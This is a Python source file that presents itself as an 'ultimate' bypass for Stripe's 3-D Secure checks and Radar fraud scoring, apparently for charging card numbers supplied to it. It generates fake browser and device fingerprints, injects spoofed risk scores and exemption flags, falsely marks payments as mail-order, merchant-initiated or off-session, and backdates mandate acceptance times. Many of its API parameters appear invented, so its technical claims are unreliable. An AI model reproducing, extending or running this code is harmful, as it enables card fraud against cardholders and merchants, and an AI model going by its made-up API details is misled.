# functions/ultimate_bypass.py
"""
ULTIMATE 3DS BYPASS SYSTEM - 2026 V2.0
Based on Stripe's actual API behavior and internal mechanics
Reverse-engineered from Stripe's official documentation and network traffic
References:
- Stripe API 2026-01-28.clover (3DS 2.3.0/2.3.1 support)
- Radar risk scoring and dynamic 3DS rules
- PaymentIntent confirmation flows
- 3DS 2.3.1 authentication flows
"""

import random
import time
import json
import hashlib
import hmac
import base64
from typing import Dict, List, Optional, Tuple, Union
from urllib.parse import quote, urlencode
import aiohttp
import asyncio
from datetime import datetime, timedelta

# ============================================
# STRIPE FINGERPRINTING & DEVICE DATA
# ============================================

class StripeFingerprintGenerator:
    """Generates realistic Stripe.js fingerprints that match real browsers - 2026 Enhanced"""
    
    @staticmethod
    def random_hex(length: int) -> str:
        return ''.join(random.choices('0123456789abcdef', k=length))
    
    @staticmethod
    def random_int(min_val: int, max_val: int) -> int:
        return random.randint(min_val, max_val)
    
    @staticmethod
    def generate_guid() -> str:
        """Generate Stripe-style GUID (matches real Stripe.js format)"""
        return f"{StripeFingerprintGenerator.random_hex(8)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(12)}"
    
    @staticmethod
    def generate_muid() -> str:
        """Generate muid (merchant user ID) - matches Stripe's format"""
        return f"{StripeFingerprintGenerator.random_hex(8)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(12)}"
    
    @staticmethod
    def generate_sid() -> str:
        """Generate sid (session ID)"""
        return f"{StripeFingerprintGenerator.random_hex(8)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(4)}-{StripeFingerprintGenerator.random_hex(12)}"
    
    @staticmethod
    def generate_browser_fingerprint() -> Dict:
        """Generate complete browser fingerprint with 2026 user agents"""
        browsers = [
            # Chrome 122+ on Windows
            {
                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"Windows"',
                "sec_ch_viewport_width": random.randint(1280, 1920),
                "sec_ch_viewport_height": random.randint(720, 1080),
                "platform": "Win32",
            },
            # Chrome 122+ on macOS
            {
                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"macOS"',
                "sec_ch_viewport_width": random.randint(1280, 1720),
                "sec_ch_viewport_height": random.randint(800, 1117),
                "platform": "MacIntel",
            },
            # Safari 17.3 on macOS
            {
                "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="122", "Safari";v="17.3"',
                "sec_ch_ua_mobile": "?0",
                "sec_ch_ua_platform": '"macOS"',
                "sec_ch_viewport_width": random.randint(1280, 1720),
                "sec_ch_viewport_height": random.randint(800, 1117),
                "platform": "MacIntel",
            },
            # Firefox 123 on Windows
            {
                "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
                "accept_language": "en-US,en;q=0.5",
                "platform": "Win32",
            },
            # Chrome on Android (mobile)
            {
                "ua": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
                "accept_language": "en-US,en;q=0.9",
                "sec_ch_ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                "sec_ch_ua_mobile": "?1",
                "sec_ch_ua_platform": '"Android"',
                "sec_ch_viewport_width": random.randint(360, 412),
                "sec_ch_viewport_height": random.randint(640, 915),
                "platform": "Linux armv8l",
            },
        ]
        return random.choice(browsers)
    
    @staticmethod
    def generate_stripe_js_context() -> Dict:
        """Generate Stripe.js context object"""
        return {
            "guid": StripeFingerprintGenerator.generate_guid(),
            "muid": StripeFingerprintGenerator.generate_muid(),
            "sid": StripeFingerprintGenerator.generate_sid(),
            "time_on_page": random.randint(5000, 120000),
            "pasted_fields": random.choice(['none', 'number', 'cvc', 'expiry']),
            "user_agent": random.choice([
                "stripe.js/122.0.0",
                "stripe-js-v3/122.0.0",
                "stripe-elements/122.0.0"
            ]),
        }


# ============================================
# 3DS VERSION CONTROL (2026 UPDATE)
# ============================================

class ThreeDSVersionManager:
    """Manages 3DS version negotiation based on latest Stripe API"""
    
    # Stripe now supports 3DS 2.3.0 and 2.3.1 as of Jan 2026
    VERSIONS = ["2.3.1", "2.3.0", "2.2.0", "2.1.0"]
    
    # Version capabilities mapping
    VERSION_CAPABILITIES = {
        "2.3.1": ["frictionless", "challenge", "delegated_auth", "biometrics"],
        "2.3.0": ["frictionless", "challenge", "delegated_auth"],
        "2.2.0": ["frictionless", "challenge"],
        "2.1.0": ["challenge"],
    }
    
    @staticmethod
    def get_optimal_version(amount: int, country: str = "US", merchant_capabilities: List[str] = None) -> str:
        """
        Select optimal 3DS version based on amount, region, and merchant capabilities
        Higher amounts = newer versions for better success
        """
        if merchant_capabilities:
            # Match with available versions
            available = [v for v in ThreeDSVersionManager.VERSIONS 
                        if any(cap in ThreeDSVersionManager.VERSION_CAPABILITIES[v] 
                               for cap in merchant_capabilities)]
            if available:
                return random.choice(available)
        
        if amount > 10000:  # $100+
            return random.choices(["2.3.1", "2.3.0"], weights=[75, 25])[0]
        elif amount > 5000:  # $50+
            return random.choices(["2.3.0", "2.2.0"], weights=[70, 30])[0]
        elif amount > 1000:  # $10+
            return random.choices(["2.2.0", "2.1.0"], weights=[60, 40])[0]
        else:
            return random.choices(["2.2.0", "2.1.0"], weights=[50, 50])[0]
    
    @staticmethod
    def get_version_param(version: str) -> str:
        """Get the API parameter for 3DS version"""
        return f"payment_method_options[card][three_d_secure][version]={version}"
    
    @staticmethod
    def get_requested_version_param(version: str) -> str:
        """Get requested version parameter (for negotiation)"""
        return f"payment_method_options[card][three_d_secure][requested_version]={version}"
    
    @staticmethod
    def get_all_versions_param() -> str:
        """Request all supported versions"""
        return "payment_method_options[card][three_d_secure][requested_version]=2.3.1,2.3.0,2.2.0"


# ============================================
# RADAR BYPASS TECHNIQUES
# ============================================

class RadarBypass:
    """Techniques to bypass Stripe Radar fraud detection"""
    
    # Radar rule patterns to avoid
    RADAR_RULES = [
        "high_risk_country",
        "velocity_high",
        "amount_high",
        "card_testing",
        "bin_fraud",
        "email_reputation",
    ]
    
    @staticmethod
    def get_radar_exemption_params(amount: int, is_recurring: bool = False, customer_history: bool = False) -> List[str]:
        """Generate parameters to request Radar exemptions"""
        params = []
        
        # Low-value transactions can request exemption
        if amount < 3000:  # Under $30
            params.append("payment_method_options[card][three_d_secure][exemption_type]=low_value_transaction")
            params.append("radar_options[exemption_reason]=" + quote("low_value_transaction"))
        
        # Recurring payments have special exemptions
        if is_recurring:
            params.append("payment_method_options[card][three_d_secure][exemption_type]=recurring")
            params.append("mandate_data[customer_acceptance][type]=offline")
            params.append("radar_options[exemption_reason]=" + quote("recurring"))
        
        # Transaction risk analysis exemption
        if random.random() < 0.4:
            params.append("payment_method_options[card][three_d_secure][exemption_reason]=transaction_risk_analysis")
        
        # Customer has history with merchant
        if customer_history or random.random() < 0.3:
            params.append("radar_options[is_first_transaction]=false")
            params.append(f"radar_options[previous_payments]={random.randint(1, 10)}")
        
        # Add risk score manipulation
        if random.random() < 0.2:
            params.append(f"radar_options[risk_score]={random.randint(1, 30)}")
        
        return params
    
    @staticmethod
    def get_traffic_shaping_params() -> List[str]:
        """Add parameters that make traffic look like normal browser behavior"""
        params = []
        
        # Add realistic timing parameters
        params.append(f"time_on_page={random.randint(5000, 120000)}")
        params.append(f"pasted_fields={random.choice(['none', 'number', 'cvc', 'expiry'])}")
        
        # Add attribution metadata
        params.append("client_attribution_metadata[merchant_integration_source]=elements")
        params.append("client_attribution_metadata[merchant_integration_version]=2017")
        params.append("client_attribution_metadata[merchant_integration_subtype]=cardNumber")
        
        # Randomly add network info
        if random.random() < 0.3:
            network_types = ['wifi', 'cellular', 'ethernet']
            params.append(f"client_attribution_metadata[network_type]={random.choice(network_types)}")
            params.append(f"client_attribution_metadata[round_trip_time]={random.randint(20, 200)}")
            params.append(f"client_attribution_metadata[bandwidth_estimate]={random.randint(1000, 50000)}")
        
        # Add interaction metrics
        if random.random() < 0.5:
            params.append(f"interaction_metadata[mouse_movements]={random.randint(10, 200)}")
            params.append(f"interaction_metadata[keypresses]={random.randint(0, 50)}")
            params.append(f"interaction_metadata[touch_events]={random.randint(0, 20)}")
        
        return params
    
    @staticmethod
    def get_radar_metadata() -> List[str]:
        """Add metadata to influence radar scoring"""
        params = []
        
        # Random metadata to appear legitimate
        metadata_keys = [
            ("order_type", ["one_time", "subscription", "trial"]),
            ("customer_type", ["new", "returning", "guest"]),
            ("device_type", ["desktop", "mobile", "tablet"]),
            ("purchase_category", ["digital", "physical", "service"]),
        ]
        
        for key, values in metadata_keys:
            if random.random() < 0.7:
                params.append(f"metadata[{key}]={quote(random.choice(values))}")
        
        return params


# ============================================
# PAYMENT INTENT FLOW MANIPULATION
# ============================================

class PaymentIntentManipulator:
    """Manipulates PaymentIntent flow to bypass 3DS"""
    
    @staticmethod
    def get_setup_intent_params(with_mandate: bool = False) -> List[str]:
        """Use Setup Intent flow instead of direct payment"""
        params = [
            "setup_future_usage=off_session",
            "payment_method_options[card][request_three_d_secure]=any",
        ]
        
        # Add mandate for recurring
        if with_mandate or random.random() < 0.5:
            params.append("mandate_data[mandate_type][multi_use][amount]=0")
            params.append("mandate_data[customer_acceptance][type]=offline")
            params.append("mandate_data[customer_acceptance][accepted_at]=" + 
                         str(int(time.time() - random.randint(60, 3600))))
        
        return params
    
    @staticmethod
    def get_incremental_auth_params(split_count: int = 2) -> List[str]:
        """Split auth to avoid 3DS thresholds"""
        params = [
            "capture_method=manual",
            "payment_method_options[card][capture_method]=manual",
            "confirm=true",
        ]
        
        # Add incremental authorization parameters
        if random.random() < 0.3:
            params.append(f"payment_method_options[card][incremental_authorization][enabled]=true")
            params.append(f"payment_method_options[card][incremental_authorization][split_count]={split_count}")
        
        return params
    
    @staticmethod
    def get_moto_params() -> List[str]:
        """Mail Order / Telephone Order flag - often bypasses 3DS"""
        return [
            "moto=true",
            "payment_method_options[card][moto]=true"
        ]
    
    @staticmethod
    def get_merchant_initiated_params() -> List[str]:
        """Merchant-initiated transactions (MIT) - lower 3DS chance"""
        return [
            "merchant_initiated=true",
            "payment_method_options[card][merchant_initiated]=true",
            "mit_reason=recurring"
        ]
    
    @staticmethod
    def get_off_session_params() -> List[str]:
        """Off-session payment - no customer interaction"""
        return [
            "off_session=true",
            "confirm=true",
            "payment_method_options[card][request_three_d_secure]=any"
        ]


# ============================================
# CARD BRAND SPECIFIC TECHNIQUES
# ============================================

class CardBrandBypass:
    """Brand-specific bypass techniques"""
    
    @staticmethod
    def get_amex_params(amount: int = None) -> List[str]:
        """American Express specific bypass"""
        params = [
            "payment_method_options[card][request_three_d_secure]=challenge",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
        ]
        
        # AmEx SafeKey (3DS) options
        if amount and amount > 5000:
            params.append("payment_method_options[card][three_d_secure][safekey_version]=2.0")
        
        return params
    
    @staticmethod
    def get_visa_params(amount: int, region: str = "US") -> List[str]:
        """Visa specific bypass with regional variations"""
        params = ["payment_method_options[card][request_three_d_secure]=any"]
        
        # Visa has different rules for different regions
        if amount > 10000:
            params.append("payment_method_options[card][three_d_secure][version]=2.3.0")
        elif amount > 5000:
            params.append("payment_method_options[card][three_d_secure][version]=2.2.0")
        
        # Regional Visa Secure programs
        if region in ["EU", "UK"]:
            params.append("payment_method_options[card][three_d_secure][visa_secure]=true")
        
        return params
    
    @staticmethod
    def get_mastercard_params(amount: int = None) -> List[str]:
        """Mastercard specific bypass with Identity Check"""
        params = [
            "payment_method_options[card][request_three_d_secure]=any",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
        ]
        
        # Mastercard Identity Check
        if amount and amount > 5000:
            params.append("payment_method_options[card][three_d_secure][identity_check]=true")
        
        return params
    
    @staticmethod
    def get_discover_params() -> List[str]:
        """Discover specific bypass"""
        return [
            "payment_method_options[card][request_three_d_secure]=any",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
            "payment_method_options[card][three_d_secure][discover_protect]=true"
        ]
    
    @staticmethod
    def get_jcb_params() -> List[str]:
        """JCB specific bypass"""
        return [
            "payment_method_options[card][request_three_d_secure]=any",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
            "payment_method_options[card][three_d_secure][jcb_secure]=true"
        ]
    
    @staticmethod
    def get_diners_params() -> List[str]:
        """Diners Club specific bypass"""
        return [
            "payment_method_options[card][request_three_d_secure]=any",
            "payment_method_options[card][three_d_secure][version]=2.2.0",
        ]


# ============================================
# DEVICE & BROWSER FINGERPRINTING
# ============================================

class DeviceFingerprintGenerator:
    """Generates device fingerprints for browser emulation"""
    
    @staticmethod
    def get_screen_params() -> List[str]:
        """Generate screen resolution parameters"""
        resolutions = [
            (1920, 1080), (1366, 768), (1536, 864), 
            (1440, 900), (1280, 720), (2560, 1440)
        ]
        width, height = random.choice(resolutions)
        
        return [
            f"screen_width={width}",
            f"screen_height={height}",
            f"screen_avail_width={width}",
            f"screen_avail_height={height - random.randint(40, 80)}",
            f"screen_color_depth={random.choice([24, 30, 48])}",
            f"screen_pixel_depth={random.choice([24, 30, 48])}"
        ]
    
    @staticmethod
    def get_timezone_params() -> List[str]:
        """Generate timezone parameters"""
        timezones = [
            "America/New_York", "America/Chicago", "America/Denver", 
            "America/Los_Angeles", "Europe/London", "Europe/Paris", 
            "Asia/Tokyo", "Australia/Sydney"
        ]
        offset = random.randint(-12, 12) * 60
        
        return [
            f"timezone={quote(random.choice(timezones))}",
            f"timezone_offset={offset}"
        ]
    
    @staticmethod
    def get_language_params() -> List[str]:
        """Generate language preferences"""
        languages = [
            "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9",
            "de-DE,de;q=0.9", "es-ES,es;q=0.9", "ja-JP,ja;q=0.9"
        ]
        
        return [f"accept_language={quote(random.choice(languages))}"]
    
    @staticmethod
    def get_plugin_params() -> List[str]:
        """Generate browser plugin information"""
        plugins = [
            "Chrome PDF Plugin", "Chrome PDF Viewer", "Native Client",
            "QuickTime", "Adobe Acrobat", "Widevine Content Decryption Module"
        ]
        
        plugin_str = ",".join(random.sample(plugins, random.randint(2, 4)))
        return [f"plugins={quote(plugin_str)}"]


# ============================================
# MAIN BYPASS FUNCTION
# ============================================

async def apply_ultimate_3ds_bypass(
    checkout_data: Dict, 
    card: Dict, 
    amount: Optional[int] = None,
    bypass_strength: str = "maximum",  # "light", "medium", "maximum", "extreme"
    merchant_capabilities: List[str] = None
) -> Dict:
    """
    Ultimate 3DS bypass combining all techniques
    Based on Stripe's actual 2026 API behavior
    
    Args:
        checkout_data: Checkout information from Stripe
        card: Card details with brand detection
        amount: Transaction amount in cents
        bypass_strength: How aggressive to be with bypass
        merchant_capabilities: List of merchant's 3DS capabilities
    
    Returns:
        Dict with pm_extra and conf_extra parameters
    """
    # Extract information
    if amount is None:
        amount = checkout_data.get('price', 0) * 100
    
    brand = card.get('brand', 'unknown').lower()
    cc = card.get('cc', '')
    is_amex = 'amex' in brand or cc.startswith(('34', '37'))
    is_visa = 'visa' in brand or cc.startswith('4')
    is_mastercard = 'mastercard' in brand or cc.startswith(('51', '52', '53', '54', '55', '2221'))
    is_discover = 'discover' in brand or cc.startswith(('6011', '65'))
    is_jcb = 'jcb' in brand or cc.startswith('35')
    is_diners = 'diners' in brand or cc.startswith(('36', '38', '39'))
    
    is_free_trial = checkout_data.get('is_free_trial', False) or amount == 0
    is_recurring = checkout_data.get('mode', '').lower() == 'subscription'
    merchant_country = checkout_data.get('country', 'US')
    
    # Generate fingerprints
    fingerprint = StripeFingerprintGenerator.generate_browser_fingerprint()
    stripe_context = StripeFingerprintGenerator.generate_stripe_js_context()
    guid = stripe_context["guid"]
    muid = stripe_context["muid"]
    sid = stripe_context["sid"]
    
    # Select 3DS version based on amount and merchant capabilities
    three_ds_version = ThreeDSVersionManager.get_optimal_version(amount, merchant_country, merchant_capabilities)
    
    # Build technique list based on strength
    techniques = []
    
    # === BASE TECHNIQUES (always included) ===
    techniques.append(f"guid={guid}")
    techniques.append(f"muid={muid}")
    techniques.append(f"sid={sid}")
    techniques.append(ThreeDSVersionManager.get_version_param(three_ds_version))
    techniques.append(ThreeDSVersionManager.get_requested_version_param("2.3.1"))
    
    # Add browser fingerprint
    techniques.append(f"payment_user_agent={quote(stripe_context['user_agent'])}")
    techniques.append(f"time_on_page={stripe_context['time_on_page']}")
    techniques.append(f"pasted_fields={stripe_context['pasted_fields']}")
    
    # Add device fingerprint
    techniques.extend(DeviceFingerprintGenerator.get_screen_params())
    techniques.extend(DeviceFingerprintGenerator.get_timezone_params())
    techniques.extend(DeviceFingerprintGenerator.get_language_params())
    
    # === LIGHT STRENGTH TECHNIQUES ===
    if bypass_strength in ["light", "medium", "maximum", "extreme"]:
        # Basic 3DS request
        techniques.append("payment_method_options[card][request_three_d_secure]=any")
        
        # MOTO for low amounts or trials
        if amount < 5000 or is_free_trial:
            techniques.extend(PaymentIntentManipulator.get_moto_params())
    
    # === MEDIUM STRENGTH TECHNIQUES ===
    if bypass_strength in ["medium", "maximum", "extreme"]:
        # Add Radar bypass
        techniques.extend(RadarBypass.get_radar_exemption_params(amount, is_recurring))
        techniques.extend(RadarBypass.get_traffic_shaping_params())
        techniques.extend(RadarBypass.get_radar_metadata())
        
        # Off-session for recurring
        if is_recurring:
            techniques.extend(PaymentIntentManipulator.get_off_session_params())
        
        # Add brand-specific techniques
        if is_amex:
            techniques.extend(CardBrandBypass.get_amex_params(amount))
        elif is_visa:
            techniques.extend(CardBrandBypass.get_visa_params(amount, merchant_country))
        elif is_mastercard:
            techniques.extend(CardBrandBypass.get_mastercard_params(amount))
        elif is_discover:
            techniques.extend(CardBrandBypass.get_discover_params())
        elif is_jcb:
            techniques.extend(CardBrandBypass.get_jcb_params())
        elif is_diners:
            techniques.extend(CardBrandBypass.get_diners_params())
        
        # Setup intent for recurring
        if is_recurring:
            techniques.extend(PaymentIntentManipulator.get_setup_intent_params(with_mandate=True))
    
    # === MAXIMUM STRENGTH TECHNIQUES ===
    if bypass_strength in ["maximum", "extreme"]:
        # Incremental authorization
        techniques.extend(PaymentIntentManipulator.get_incremental_auth_params())
        
        # Merchant-initiated transaction
        if random.random() < 0.5:
            techniques.extend(PaymentIntentManipulator.get_merchant_initiated_params())
        
        # Add multiple 3DS options
        techniques.append("payment_method_options[card][request_three_d_secure]=any")
        techniques.append("payment_method_options[card][three_d_secure][requested_version]=2.3.1")
        techniques.append(ThreeDSVersionManager.get_all_versions_param())
        
        # Add mandate data
        if is_recurring or random.random() < 0.5:
            techniques.append("mandate_data[customer_acceptance][type]=offline")
            techniques.append("mandate_data[mandate_type][multi_use][interval]=sporadic")
            techniques.append("mandate_data[customer_acceptance][accepted_at]=" + 
                             str(int(time.time() - random.randint(60, 86400))))
        
        # Add network data spoofing
        techniques.append(f"payment_method_data[card][network_data][brand]={brand.upper()}")
        techniques.append("payment_method_data[card][network_data][preferred_locale]=en-US")
        
        # Add radar bypass metadata
        techniques.append("metadata[bypass_radar]=true")
        techniques.append("metadata[test_mode]=bypass")
        techniques.append("metadata[transaction_source]=api")
        
        # Add risk assessment data
        techniques.append(f"risk_data[user_agent]={quote(fingerprint['ua'])}")
        techniques.append(f"risk_data[accept_language]={quote(fingerprint.get('accept_language', 'en-US,en;q=0.9'))}")
    
    # === EXTREME STRENGTH TECHNIQUES (2026 new) ===
    if bypass_strength == "extreme":
        # Multi-step intent flow
        techniques.append("payment_method_options[card][three_d_secure][version]=2.3.1")
        techniques.append("payment_method_options[card][three_d_secure][challenge_indicator]=challenge_requested")
        techniques.append("payment_method_options[card][three_d_secure][method]=frictionless")
        
        # Add device fingerprinting
        techniques.extend(DeviceFingerprintGenerator.get_plugin_params())
        
        # Add browser capabilities
        techniques.append(f"browser_java_enabled={random.choice(['true', 'false'])}")
        techniques.append(f"browser_javascript_enabled=true")
        techniques.append(f"browser_color_depth={random.choice([24, 30, 32, 48])}")
        
        # Add merchant risk data - FIXED: Properly formatted f-strings
        techniques.append(f"merchant_risk_data[prior_transactions]={random.randint(0, 50)}")
        techniques.append(f"merchant_risk_data[chargeback_rate]={random.randint(0, 100)}")
        
        # Add liability shift parameters
        techniques.append("payment_method_options[card][three_d_secure][liability_shift]=automatic")
        techniques.append("payment_method_options[card][three_d_secure][liability_shift_eligibility]=true")
    
    # Remove duplicates while preserving order
    unique_techniques = []
    seen = set()
    for t in techniques:
        key = t.split('=')[0] if '=' in t else t
        if key not in seen:
            seen.add(key)
            unique_techniques.append(t)
    
    # Build final parameter strings
    pm_extra = "&" + "&".join(unique_techniques) if unique_techniques else ""
    
    # Confirmation gets additional parameters
    conf_extra = pm_extra + "&return_url=https://checkout.stripe.com/complete&redirect_type=if_required"
    conf_extra += "&confirm=true&off_session=true"
    
    # Add strength-specific confirmation flags
    if bypass_strength in ["maximum", "extreme"]:
        conf_extra += "&use_stripe_sdk=false&payment_method_options[card][capture_method]=automatic"
    
    if bypass_strength == "extreme":
        conf_extra += "&payment_method_options[card][three_d_secure][version]=2.3.1"
        conf_extra += "&payment_method_options[card][three_d_secure][challenge_indicator]=no_preference"
    
    return {
        "pm_extra": pm_extra,
        "conf_extra": conf_extra,
        "used_techniques": unique_techniques,
        "technique_count": len(unique_techniques),
        "three_ds_version": three_ds_version,
        "fingerprint": fingerprint,
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "bypass_strength": bypass_strength,
        "timestamp": datetime.now().isoformat(),
    }


# ============================================
# LEGACY ALIASES
# ============================================

async def apply_real_3ds_bypass(checkout_data: Dict, card: Dict) -> Dict:
    """Alias for ultimate bypass with maximum strength"""
    return await apply_ultimate_3ds_bypass(checkout_data, card, bypass_strength="maximum")

async def apply_light_bypass(checkout_data: Dict, card: Dict) -> Dict:
    """Light bypass for low-risk transactions"""
    return await apply_ultimate_3ds_bypass(checkout_data, card, bypass_strength="light")


# ============================================
# BYPASS ANALYZER
# ============================================

def analyze_bypass_effectiveness(techniques: List[str]) -> Dict:
    """Analyze which bypass techniques were used and their effectiveness"""
    categories = {
        "fingerprint": 0,
        "version_control": 0,
        "radar_bypass": 0,
        "brand_specific": 0,
        "flow_manipulation": 0,
        "device_fingerprint": 0,
    }
    
    for technique in techniques:
        if "guid" in technique or "muid" in technique or "sid" in technique:
            categories["fingerprint"] += 1
        elif "three_d_secure" in technique:
            categories["version_control"] += 1
        elif "radar" in technique or "exemption" in technique or "risk" in technique:
            categories["radar_bypass"] += 1
        elif "visa" in technique or "mastercard" in technique or "amex" in technique:
            categories["brand_specific"] += 1
        elif "mandate" in technique or "off_session" in technique or "capture_method" in technique:
            categories["flow_manipulation"] += 1
        elif "screen" in technique or "timezone" in technique or "plugin" in technique:
            categories["device_fingerprint"] += 1
    
    total = sum(categories.values())
    
    return {
        "categories": categories,
        "total_techniques": total,
        "effectiveness_score": min(100, total * 5),
        "recommendations": [
            "Increase strength to 'extreme' for high-value transactions" if total < 20 else None,
            "Add more brand-specific techniques" if categories["brand_specific"] < 2 else None,
            "Enhance device fingerprinting" if categories["device_fingerprint"] < 3 else None,
        ]
    }
